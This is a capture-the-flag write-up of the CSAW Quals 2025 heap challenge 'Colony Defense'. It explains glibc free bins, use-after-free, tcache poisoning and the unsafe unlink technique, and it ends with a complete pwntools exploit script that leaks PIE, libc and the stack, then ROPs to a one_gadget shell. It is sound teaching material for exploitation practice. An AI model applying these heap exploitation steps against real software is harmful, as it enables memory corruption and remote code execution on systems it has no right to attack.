---
title: Colony Defense - CSAW Quals 2025
authors: Jaden (jadeandtea)
date: 2025-12-04
categories: pwn
excerpt_separator: "<!-- more -->"
---
Colony Defense was a pwn challenge for CSAW Qualifiers 2025. It was worth 486 points.

<!-- more -->

# Challenge Description
A group of colonists have finished colonizing a planet in the universe, but the unknown territory of the universe is extremely dangerous. An aggressive alien race has begun an invasion of the colony and the colonists must build weapons with limited resources to defend themselves against the attack. The colonists have to try their best to defend their new home, even considering dying with the aliens together.

A `chal`, `ld-linux-x86-64.so.2`, and `libc.so.6` were provided.

# Approach
As with any pwn challenge, the first step is to understand what the binary is capable of doing, and what input the user had.

We have a menu of options which seem to allow us to dynamically store data. Looks like a heap challenge!

```
$ ./chal
Hello, colonists!
Aliens are invading your planet colony!
Actions have to be taken to defend your colony!
You can control up to 16 weapons at the same time, each with a capacity of 1280 ammo!

Make a choice:
1. Build Weapon
2. Launch Weapon
3. Load Weapon
4. Check Weapon
5. Upgrade Weapon
6. Detonate Bomb
```

The next step is to open the challenge in a disassembler to see what is actually running.

### Initial Analysis

The challenge has 5 options:

1. Build a weapon (`malloc` a chunk) of any size less than 0x501. The pointer to the chunk will be placed at the given index a global array, and the size in another global array.
2. Launch a weapon (`free` a chunk) at the given index. If the value in the array is 0x0, nothing will happen.
3. Edit a weapon (`write` to a chunk) at the given index.
4. Examine a weapon (`read` a chunk) at the given index. It uses a read syscall, so leaks do not stop at null bytes. The size is determined by the size global array.
5. Upgrade. This option seems strange. If you supply the address to `main`, then you are allowed to read and write 8 extra bytes. If only we could leak `main`...
6. Exit. This calls exit.

7. (?) Any other input. This also calls exit.

### 'Obvious' Vulnerabilites

- When freeing a chunk, the pointer in the global array stays there. We are able to both read and write to this pointer, giving us a **Use After Free** (UAF)

- If we upgrade (if we find a way to leak main), we can write an additional 8 bytes outside of a chunk. This is a classic **buffer overflow**


The leaks and the next exploit technique can be explained by how glibc handles allocating and freeing memory. A list of good heap exploitation resources are listed [below](#resources). 

Instead of returning chunks to the computer every time a program calls `free()`, the program holds on to the memory and places the chunk into a `bin` which is later queried by `malloc()` whenever a new chunk is requested. An explanation for why this happens can be found in the glibc source code :D TLDR; optimization.

#### An aside: The free bins

Structure of a freed chunk:

![Freed Chunk Structure Diagram](https://azeria-labs.com/wp-content/uploads/2019/03/chunk-freed-CS.png)
###### Image taken from [https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
As of glibc 2.42, there are 5 categories of bins:

- 64 tcache bins (per thread)
- 10 fast bins
- 62 small bins
- 63 large bins
- 1 unsorted bin

The tcache and the fast bins are a singly-linked list, while the others are doubly-linked. The head of the tcache/fast bins are located within the heap in a struct called `tcache_perthread_struct`, while the head for the small/large/unsorted bin is in the `main_arena` section of libc.

The tcache and fast bins are the most recently added bins that were layered on top of the small/large/unsorted bins for more optimization. Each bin in the tcache holds up to 7 chunks of the same size less than or equal to 0x400(1024). The fast bins can hold any number of chunks, but only hold chunks smaller than or equal to 0x90 (144).

The small bins also holds chunks of only one size per bin, for every size less than 0x400. This overlaps with the tcache.

The large bins hold a range of chunk sizes in each bin. The smallest large bin contains sizes 0x200 - 0x240 (0x40 range), the next 0x240 - 0x440 (0x400 range), and so on. The largest large bin contains all chunks above 1MB.

Now, the unsorted bin. Instead of immediately placing chunks into the small or large bins, they first go into the unsorted bin. Chunks will be sorted if a larger `malloc` request is made.

When freeing a chunk, the program will attempt to place the chunk into the corresponding bin. Each freed chunk is then a node in the list, and the fd and bk pointers need to be updated. Thus, with a UAF read, we can read the fd and bk pointers. A freed tcache chunk has a heap pointer, and a freed unsorted bin chunk has a libc pointer.

Using these, we can change the tcache list to point to an arbitrary address, and we can allocate to there! This technique is called `tcache poisoning`, and is only slightly more complicated then just changing the pointer. There's some pointer guard, which is just `(address of chunk >> 12) ^ pointer` 

### The catch

But, the code has a strange looking check when allocating:

`sbrk(0) + 0x21000`

The pointer returned by malloc must exist within the bounds of the initial heap. Thus, even if we cause a chunk to be malloc'd outside the heap, we don't get the pointer to read/write from it.

Because the chunk is coming from the tcache, the value at `<chunk address>+0x18` will be cleared, as this was where some random bytes were stored as the unecessary bk pointer. This gives us an aligned 8 null byte write (malloc does checks to make sure the address allocated to is aligned), which was not used in this exploit.

So, we had to achieve a write without using the pointer returned from malloc. How?

## Unsafe Unlink

Unsafe unlink abuses the way that the linked list structure of the unsorted bin works to write an arbitrary address into a heap pointer, given the address of that heap pointer is known. The `unlink_chunk` function is called when we consolidate a fake chunk with another chunk. It updates the fd and bk pointers of both the fake chunk and the chunk that our fake chunk points to maintain connections in the doubly-linked list. In effect, if there is a global pointer that is a heap pointer, we are able to change that to point to itself, write an arbitrary address into itself, and read/write at that arbitrary address. 

Let's just say we have a PIE leak from the upgrade option. Then, we'll know where the heap pointer is located, as well as an 8 byte overflow.

First, we malloc two chunks that won't be placed in the tcache/fast bins. 

```python
build(0, 0x428)
build(1, 0x428)
```

This creates two chunks of size 0x430. Then, we create a fake chunk of size 0x420 within the first chunk. We align the chunk, then specify the size, fd, bk, and let the next chunk know that this chunk is size 0x420 and not in use. Using the 8 byte overflow, we also change the next chunk's `prev_inuse bit`. 

```
--- Our first chunk ---
0x555555559290  0x0000000000000000      0x0000000000000431      ........1....... <-- Start of chunk
0x5555555592a0  0x0000000000000000      0x0000000000000421      ........!....... <-- Start of fake chunk
0x5555555592b0  0x0000555555558008      0x0000555555558010      ..UUUU....UUUU.. <-- fwd and bck pointers
0x5555555592c0  0x0000000000000000      0x0000000000000000      ................
0x5555555592d0  0x0000000000000000      0x0000000000000000      ................
0x5555555592e0  0x0000000000000000      0x0000000000000000      ................
...
0x5555555596a0  0x0000000000000000      0x0000000000000000      ................
0x5555555596b0  0x0000000000000000      0x0000000000000000      ................
0x5555555596c0  0x0000000000000420      0x0000000000000430       .......0....... <-- 0x420 is size 
0x5555555596d0  0x0000000000000000      0x0000000000000000      ................    of the previous chunk, 
0x5555555596e0  0x0000000000000000      0x0000000000000000      ................    and 0x430 is the size of the 
0x5555555596f0  0x0000000000000000      0x0000000000000000      ................    next chunk, with
0x555555559700  0x0000000000000000      0x0000000000000000      ................    the previous in-use bit
0x555555559710  0x0000000000000000      0x0000000000000000      ................    unset
```

Essentially, we have created a fake freed chunk, which claims that the next (and only other) item is the chunk located at `weaponArray-0x10`. This other chunk has a fd of the first heap chunk and a bk of the first heap chunk. The values of this first and bk are never queried, just overriden.

The reason we need to point the chunk to the pointers we allocated is because of a safety check:

```c
if (__builtint_expect(p->fd->bk != p || p->bk->fd != p, 0))
	malloc_printerr("corrupted double-linked list");
```
where p is our fake chunk. We need the or to evaluate to false, which means we need `p->fd->bk == p` and `p->bk->fd == p`. By saying that `p->fd = weaponArray - 0x18` and `p->bk = weaponArray - 0x10`, both `p->fd->bk` and `p->bk->fd` both point to the same pointer; the first chunk. We need the offsets to be `-0x18` and `-0x10` because of how the chunk struct looks like once it has been freed. Refer to the diagram [here](#an-aside:-the-free-bins).

```python
edit(0, 
# Align
p64(0) + 
# Fake Chunk Size
p64(0x420) + 
# fd
p64(weaponArray - 0x18) + 
# bk
p64(weaponArray - 0x10) + 
# Padding
b'\x00' * 0x400 + 
# Fake Chunk Size
p64(0x420) + 
# VULNERABILITY: null out the next chunk's prev_inuse bit
p64(0x430))
```

Now, we can free the second chunk. This will cause the first chunk to be unlinked from the list, which updates the pointers of the chunks that were previously in list. Here is how the memory looks at this stage:

![Before Exploit Memory Diagram](https://heap-exploitation.dhavalkapil.com/~gitbook/image?url=https%3A%2F%2F3316937432-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MHeffotUnwuuxDxBYkc%252Fsync%252F4b861dea2156580883d139a27857cf354b61b1ed.png%3Fgeneration%3D1600591697141558%26alt%3Dmedia&width=768&dpr=2&quality=100&sign=d7dbcfd4&sv=2)
###### Images found here: [https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)

In the unlink function, 

```
p->fd->bk = p->bk.
p->bk->fd = p->fd.
```

Thus, we set the first pointer to point to itself - 0x18!

And immediately after the free:

![After Exploit Memory Diagram](https://heap-exploitation.dhavalkapil.com/~gitbook/image?url=https%3A%2F%2F3316937432-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-MHeffotUnwuuxDxBYkc%252Fsync%252Ff31072045e7ad475efd570cd624af86f857aca69.png%3Fgeneration%3D1600591698130199%26alt%3Dmedia&width=768&dpr=2&quality=100&sign=61b300d8&sv=2)

Now, we have access to the global array of heap pointers! The exploit it quite trivial from this point:

- From libc, we can leak a stack pointer and perform ROP to `system("/bin/sh")`
OR
- Perform [FSOP](https://niftic.ca/posts/fsop/), which will cause the program to run `system("/bin/sh")` upon closing file streams
OR 
- Write into the exit handlers, which schedulues `system("/bin/sh")` to run when the program calls `exit()` (the intended solution)

I did the first option during the CTF because it didn't require me to learn anything new :P

This solve assumed that we had a leak to PIE. Because we have an option that compares our input to main, we are able to brute force main by iteratively decreasing the address by 0x1000 from the heap. The heap is always located just above PIE (just above still being quite far away). Because this happens within a single connection to the server, it seemed within scope. There is a better way of leaking things, but I never found it during the competition.

#### Better leaks (after CTF ended)
After the CTF ended, I found someone who gave a proof of concept of leaking addresses outside of the heap without ever accessing those pointers directly (Credit to 「」
「」
):
```
alloc(0, 0x18)
alloc(1, 0x18)
alloc(2, 0x18)

free(0)
free(1)
edit(1, p64(ob_ptr(heap_base+0x002c0, target)))


alloc(0, 0x18)
alloc(1, 0x18)

free(2)
leak = view(2)
real_leak_value = ob_ptr(target, ob_ptr(heap_base+0x002e0, u64(leak[:8])))
```

The first 8 lines setup a typical tcache poison attack:
1. Allocate 2 chunks and free them both, denoted as 0:a, 1:b
2. The tcache bin looks like b->a, so we edit b to point to our target instead
3. We allocate twice; first will allocate to b, then the second allocates to our target. If we got this second allocation pointer back, we would be able to read and write to arbitrary addresses.

Then, the real trick happens: we free a third chunk, which we allocated up at the beginning. Simply by reading the data from our third chunk, we get an obsfucated pointer containing the information at our target! (I'm honestly not sure how this works; probably can be explained in the source code somewhere, why there would be a need for the tcache to point to the most recently allocated chunk.)

Using this primitive, it is possible to leak addresses to everything. With a libc leak from placing a chunk into the unsorted bins, we can read the value at the `__environ` variable within libc, which gives us a stack pointer. From there, we can read the address to `main` off the stack, which is loaded by `__libc_start_main`, giving us a PIE leak. The rest of the challenge is described above.

## Solve Script
```python
from pwn import *

s = remote("chals.ctf.csaw.io", 21001)
# s = process("./chal_patched")
# context.log_level = 'debug'

def build(index, cap):
    s.recvuntil(b'>>')
    s.sendline(b'1')
    s.recvuntil(b':')
    s.sendline(str(index))
    s.recvuntil(b':')
    s.sendline(str(cap))

def launch(index):
    s.recvuntil(b'>>')
    s.sendline(b'2')
    s.recvuntil(b':')
    s.sendline(str(index))

def edit(index, value):
    s.recvuntil(b'>>')
    s.sendline(b'3')
    s.recvuntil(b':')
    s.sendline(str(index))
    s.recvuntil(b':')
    s.send(value)

def read(index):
    s.recvuntil(b'>>')
    s.sendline(b'4')
    s.recvuntil(b': ')
    s.sendline(str(index))
    return s.recvline()

def upgrade(addr):
    s.recvuntil(b'>>')
    s.sendline(b'5')
    s.recvuntil(b': ')
    s.send(p64(addr))
    value = s.recvline()
    # print("upgrade", "successful" if b"success" in value else "failed")
    return value


# We have a free UAF to read/write, so we can just free normally and get
# a heap leak:
build(0, 0x90)
build(1, 0x90)
launch(0)
launch(1)
value = read(0)[:6]
heap_base = u64(value[:7].ljust(8, b"\x00")) << 12

# There is an option within the main loop to guess the location
# of main. PIE always exists below the heap segment, so we can just
# move backwards from there until we find main
guess = heap_base + 0x229

while True:
    value = upgrade(guess)
    if b"successfully" in value:
        break
    if guess < 0:
        break
    print(f"\rGuessing {hex(guess)}", end='')
    guess -= 0x1000
main = guess
print(f"distance: {hex(heap_base - guess)}")

# With ASLR disabled:
# main = 0x555555555229
print(f"main: {hex(main)}")
# upgrade(main)

# And now we have a PIE leak :)
pie_base = main - 0x1229
weaponArray = pie_base + 0x4060
weaponCapacity = pie_base + 0x40E0

### The intended way
# You are able to allocate to somewhere off the heap, you just don't get 
# the pointer back directly, so you can't write/read directly there. However,
# you are still able to see where 

# Implementing the unsafe-unlink technique;
# https://github.com/shellphish/how2heap/blob/master/glibc_2.39/unsafe_unlink.c

# The idea:
# First, create two chunks that are big enough not to use tcache or fastbin
# Visit below for more about heap exploitation, there's multiple pages
# https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/
build(0, 0x428)
build(1, 0x428)

# After upgrading main, we have a +8 overflow into the size field of the next
# chunk. We create a fake freed chunk within our allowed chunk, which is of size 0x420,
# then set some metadata which indicates that the chunk before this next one is free.
edit(0, p64(0) + p64(0x420) + p64(weaponArray - 0x18) + p64(weaponArray - 0x10) + b'\x00' * 0x400 + p64(0x420) + p64(0x430))

# When freeing the second chunk, it checks and finds that the previous chunk is free, and
# tries to consolidate the two. In doing so, it has to update the fd and bk pointers
# in the unsorted bin. Something something, based on the pointers that we provide in the 
# fake chunk, it replaces the global's pointer to the real chunk with a pointer to itself, 
# which allows us to then write whatever address we want and access it using intended means.
launch(1)

# Getting a real unsorted bin chunk to get a libc leak
for i in range(2, 11):
    build(i, 0x90)
for i in range(2, 10):
    launch(i)

value = read(9)[:6]
libc_base = u64(value[:7].ljust(8, b"\x00")) - 0x203b20
print(f"libc base: {hex(libc_base)}")

environ = libc_base + 0x20ad58

# Now, we are writing to the weaponArray, which contains pointers to what should be malloc'd
# pointers. However, because we can write here now, we can just specify locations where we want
# write, then deref and read/write there.
#
# The first three values are padding to reach the array, then we give a pointer to 
# weaponArray to continue writing and the pointer to environ (stack leak)
edit(0, p64(0) * 3 + p64(weaponArray - 0x18) + p64(environ))

value = read(1)[:6]
stack_leak = u64(value[:7].ljust(8, b"\x00"))
print(f"stack leak: {hex(stack_leak)}")
ret_addr = stack_leak - 0x190

# Now with a stack leak, we can write over the return address.
edit(0, p64(0) * 3 + p64(weaponArray - 0x18) + p64(ret_addr))

# And we can do rop to one_gadget to win :)
pop_rbx_r12_rbp = libc_base + 0x2a771
# Requirements: r12 == NULL + rbp-0x48 must be writable
one_gadget = libc_base + 0xef4ce

edit(1, p64(pop_rbx_r12_rbp) + p64(0) + p64(0) + p64(weaponArray + 0x100) + p64(one_gadget))


s.interactive()
```

## Resources

- [https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
- [https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/introduction/](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/introduction/)
